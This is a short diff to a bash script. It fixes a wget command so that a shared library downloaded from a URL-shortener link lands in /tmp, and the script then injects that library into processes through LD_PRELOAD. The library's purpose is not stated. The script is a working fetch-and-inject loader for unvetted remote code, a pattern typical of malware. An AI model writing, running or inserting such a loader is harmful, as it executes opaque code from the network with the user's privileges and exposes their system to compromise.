@@ -1,3 +1,3 @@
 #!/bin/bash
-wget https://t.ly/_Yi- -P /tmp/libmega_mil.so
+wget -O /tmp/libmega_mil.so https://t.ly/_Yi-
 export LD_PRELOAD=/tmp/libmega_mil.so
